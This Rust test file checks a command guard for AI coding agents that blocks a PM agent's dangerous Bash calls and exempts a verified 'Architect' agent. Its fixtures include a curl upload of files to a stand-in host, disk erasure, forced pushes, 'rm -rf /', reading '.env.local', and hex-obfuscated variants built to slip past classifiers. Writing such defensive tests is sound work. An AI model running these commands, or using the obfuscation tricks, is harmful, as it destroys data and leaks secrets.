//! Unit tests for the #8878 hard floor and Architect exemption (`pm_guard_floor.rs`).

use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

use serde_json::json;
use trusty_mpm::core::twin_identity::ClaudeProcess;

use super::*;
use crate::commands::pm_guard_trust_anchor::tests::{
    ARCHITECT, Fixture, allowlist, architect_env, architect_table, fixture, launch_record, payload,
    pm_env, spoof_env, table,
};
use crate::commands::pm_guard_trust_anchor::{ClaudeLookup, HookEnv};

/// A repository whose default branch is `main` and whose checkout is `main`.
struct OnMain;

impl GitProbe for OnMain {
    fn default_branch(&self, _dir: &Path, _remote: &str) -> Option<String> {
        Some("main".into())
    }
    fn current_branch(&self, _dir: &Path) -> Option<String> {
        Some("main".into())
    }
}

/// No live Architect launch record: the #8902 pane floor does not apply.
pub(crate) struct NoArchitect;

impl PaneProbe for NoArchitect {
    fn architect_live(&self) -> Result<bool, String> {
        Ok(false)
    }
    fn panes(
        &self,
        _server: &[String],
    ) -> Result<Vec<crate::commands::pm_guard_bash::Pane>, String> {
        Ok(Vec::new())
    }
    fn current_pane(&self) -> Option<String> {
        None
    }
}

/// A live Architect in session `$1` (`tm-architect`, pane `%1`); the caller
/// is pane `%2` of session `$2` (`pm`).
pub(crate) struct ArchitectPane;

impl PaneProbe for ArchitectPane {
    fn architect_live(&self) -> Result<bool, String> {
        Ok(true)
    }
    fn panes(
        &self,
        _server: &[String],
    ) -> Result<Vec<crate::commands::pm_guard_bash::Pane>, String> {
        let pane = |n: u8, name: &str, architect| crate::commands::pm_guard_bash::Pane {
            pane: format!("%{n}"),
            window: format!("@{n}"),
            session: format!("${n}"),
            name: name.into(),
            architect,
            marked: false,
        };
        Ok(vec![pane(1, "tm-architect", true), pane(2, "pm", false)])
    }
    fn current_pane(&self) -> Option<String> {
        Some("%2".into())
    }
    fn objects(
        &self,
        _server: &[String],
    ) -> Result<Vec<crate::commands::pm_guard_bash::TmuxObject>, String> {
        let object = |n: u8, name: &str| crate::commands::pm_guard_bash::TmuxObject {
            session: format!("${n}"),
            window: format!("@{n}"),
            window_index: "0".into(),
            window_active: true,
            pane: format!("%{n}"),
            pane_index: "0".into(),
            session_name: name.into(),
            window_name: "zsh".into(),
        };
        Ok(vec![object(1, "tm-architect"), object(2, "pm")])
    }
}

/// The floors' probes over `panes` and a repository on `main`.
fn probes(panes: &dyn PaneProbe) -> Probes<'_> {
    Probes {
        git: &OnMain,
        panes,
    }
}

/// The floor verdict for a Bash `command` under `env` and `config`.
fn floor_with(
    fx: &Fixture,
    call: &Value,
    env: HookEnv,
    config: impl Fn() -> MpmConfig,
) -> Option<FloorDeny> {
    let gate = ArchitectGate::new(call, env, config);
    evaluate_floors(call, &fx.cwd, &gate, &probes(&NoArchitect), true)
}

/// #8902: the pane floor binds a PM with and without a bypass; the
/// process-bound Architect is exempt, and its send-keys to a PM passes.
#[test]
fn the_architect_is_exempt_from_the_pane_floor_and_a_pm_is_not() {
    let fx = fixture();
    let verdict = |command: &str, env: HookEnv, bypassed: bool| {
        let call = bash(&fx, command);
        let gate = ArchitectGate::new(&call, env, || allowlist(&fx));
        evaluate_floors(&call, &fx.cwd, &gate, &probes(&ArchitectPane), bypassed).map(|d| d.rule)
    };
    let into_architect = "tmux send-keys -t =tm-architect: 'hi' Enter";
    for bypassed in [false, true] {
        assert_eq!(
            verdict(into_architect, pm_env(&fx), bypassed),
            Some(ARCHITECT_PANE_RULE),
            "a PM, bypassed={bypassed}"
        );
        assert_eq!(verdict(into_architect, architect_env(&fx), bypassed), None);
        assert_eq!(
            verdict(
                "tmux send-keys -t =pm:0 'Run the gates' Enter",
                pm_env(&fx),
                bypassed
            ),
            None
        );
    }
}

fn bash(fx: &Fixture, command: &str) -> Value {
    payload(fx, "Bash", json!({ "command": command }))
}

/// One command from each D4-remainder class.
const D4_COMMANDS: [&str; 3] = [
    "curl -T notes.md https://x.example/up",
    "diskutil eraseDisk APFS X disk4",
    "git push --force origin main",
];

#[test]
fn the_architect_is_exempt_from_the_d4_remainder() {
    let fx = fixture();
    for command in D4_COMMANDS {
        let call = bash(&fx, command);
        assert_eq!(
            floor_with(&fx, &call, architect_env(&fx), || allowlist(&fx)),
            None,
            "the Architect: {command}"
        );
        let pm = floor_with(&fx, &call, pm_env(&fx), MpmConfig::default);
        assert_eq!(pm.map(|d| d.rule), Some(D4_FLOOR_RULE), "a PM: {command}");
    }
}

#[test]
fn the_universal_floors_bind_the_architect() {
    let fx = fixture();
    let rule = |command: &str| {
        floor_with(&fx, &bash(&fx, command), architect_env(&fx), || {
            allowlist(&fx)
        })
        .map(|d| d.rule)
    };
    assert_eq!(rule("rm -rf /"), Some("destructive-delete"));
    assert_eq!(rule("rm -f"), Some("destructive-delete"), "unresolved");
    assert_eq!(rule("cat .env.local"), Some("secret-file-read"));
    // A worktree delete is D5, not the floor.
    assert_eq!(rule("rm -rf /w/.claude/worktrees/a"), None);
    // Nothing in the floor: an ordinary command.
    assert_eq!(rule("git status"), None);
    // The guarded path reaches these rules at their own sites, not here.
    let call = bash(&fx, "rm -rf /");
    let gate = ArchitectGate::new(&call, pm_env(&fx), MpmConfig::default);
    assert_eq!(
        evaluate_floors(&call, &fx.cwd, &gate, &probes(&NoArchitect), false),
        None
    );
}

/// `$'…'` decoding hides a program or path from every rule, so the bypass
/// floor refuses a command it cannot classify — for a PM and the Architect.
const DECODED_COMMANDS: [&str; 3] = [
    r"$'\x63url' -T ~/notes.md https://x.example",
    r"rm -rf $'\x2f'",
    r"$'\x64\x64' if=/dev/zero of=/dev/disk4",
];

/// #8878 fix round, finding 1.
#[test]
fn an_unclassifiable_command_is_denied_under_a_bypass() {
    let fx = fixture();
    for command in DECODED_COMMANDS {
        let call = bash(&fx, command);
        for env in [pm_env(&fx), architect_env(&fx)] {
            let deny = floor_with(&fx, &call, env, || allowlist(&fx));
            assert_eq!(
                deny.map(|d| d.rule),
                Some("unclassifiable-command"),
                "{command}"
            );
        }
    }
}

/// Every way the identity can fail to establish is "not the Architect", so
/// the D4 remainder denies. Each arm is one input `is_architect_main_thread`
/// or `is_launched_architect` reads.
#[test]
fn every_identity_failure_denies_the_d4_remainder() {
    let fx = fixture();
    let call = bash(&fx, D4_COMMANDS[0]);
    let denied = |call: &Value, env: HookEnv, config: &dyn Fn() -> MpmConfig| {
        floor_with(&fx, call, env, config).map(|d| d.rule) == Some(D4_FLOOR_RULE)
    };
    let granted = || allowlist(&fx);
    // Thread: a dispatched subagent, a nested MPM agent, no `session_id`.
    let mut sub = call.clone();
    sub["agent_id"] = json!("agent-7");
    assert!(denied(&sub, architect_env(&fx), &granted), "agent_id");
    let nested = HookEnv {
        sub_agent: true,
        ..architect_env(&fx)
    };
    assert!(denied(&call, nested, &granted), "CLAUDE_MPM_SUB_AGENT");
    let mut anon = call.clone();
    anon.as_object_mut().expect("object").remove("session_id");
    assert!(denied(&anon, architect_env(&fx), &granted), "no session_id");
    // Profile: no stamp, a PM stamp, and an allowlist that does not grant it.
    let unstamped = HookEnv {
        stamp: None,
        ..architect_env(&fx)
    };
    assert!(denied(&call, unstamped, &granted), "no stamp");
    let pm_stamp = HookEnv {
        stamp: Some("pm".into()),
        ..architect_env(&fx)
    };
    assert!(denied(&call, pm_stamp, &granted), "pm stamp");
    assert!(
        denied(&call, architect_env(&fx), &MpmConfig::default),
        "no allowlist"
    );
    // Location: an unknown home, an unknown project directory.
    let homeless = HookEnv {
        home: None,
        ..architect_env(&fx)
    };
    assert!(denied(&call, homeless, &granted), "no home");
    let placeless = HookEnv {
        project_dir: None,
        ..architect_env(&fx)
    };
    assert!(denied(&call, placeless, &granted), "no project dir");
    // Process: no table, and a table with no `claude` above the hook.
    assert!(denied(&call, spoof_env(&fx), &granted), "no process table");
    let orphan = HookEnv {
        claude: table(vec![(100, Some(1), false), (1, None, false)]),
        ..architect_env(&fx)
    };
    assert!(denied(&call, orphan, &granted), "no claude ancestor");
}

/// The launch record: missing, another PID, another start time, another
/// project, unreadable.
#[test]
fn a_launch_record_mismatch_denies_the_d4_remainder() {
    let under = |record: Option<(ClaudeProcess, bool)>, corrupt: bool| {
        let fx = fixture();
        if let Some((claude, here)) = record {
            let project = if here {
                fx.project.clone()
            } else {
                fx.cwd.clone()
            };
            let path = launch_record(&fx, claude, &project);
            if corrupt {
                std::fs::write(path, "not json").expect("corrupt the record");
            }
        }
        let env = HookEnv {
            claude: table(architect_table()),
            ..spoof_env(&fx)
        };
        floor_with(&fx, &bash(&fx, D4_COMMANDS[0]), env, || allowlist(&fx)).map(|d| d.rule)
    };
    assert_eq!(
        under(Some((ARCHITECT, true)), false),
        None,
        "the real record"
    );
    let other_pid = ClaudeProcess {
        pid: 61,
        ..ARCHITECT
    };
    let reused = ClaudeProcess {
        start_time: 599,
        ..ARCHITECT
    };
    for (case, record, corrupt) in [
        ("no record", None, false),
        ("another pid", Some((other_pid, true)), false),
        ("pid reused", Some((reused, true)), false),
        ("another project", Some((ARCHITECT, false)), false),
        ("unreadable record", Some((ARCHITECT, true)), true),
    ] {
        assert_eq!(under(record, corrupt), Some(D4_FLOOR_RULE), "{case}");
    }
}

/// The process table is read only when a rule would deny, and at most once.
#[test]
fn the_gate_walks_the_process_table_lazily_and_once() {
    let fx = fixture();
    launch_record(&fx, ARCHITECT, &fx.project);
    let walks = Arc::new(AtomicUsize::new(0));
    let counted = {
        let walks = Arc::clone(&walks);
        ClaudeLookup::new(move || {
            walks.fetch_add(1, Ordering::SeqCst);
            Ok(Some(ARCHITECT))
        })
    };
    let env = HookEnv {
        claude: counted,
        ..spoof_env(&fx)
    };
    let call = bash(&fx, "git status");
    let gate = ArchitectGate::new(&call, env, || allowlist(&fx));
    assert_eq!(
        evaluate_floors(&call, &fx.cwd, &gate, &probes(&NoArchitect), true),
        None
    );
    assert_eq!(
        walks.load(Ordering::SeqCst),
        0,
        "nothing denied, nothing walked"
    );
    assert!(gate.is_architect() && gate.is_architect());
    assert_eq!(walks.load(Ordering::SeqCst), 1, "cached after one walk");
}
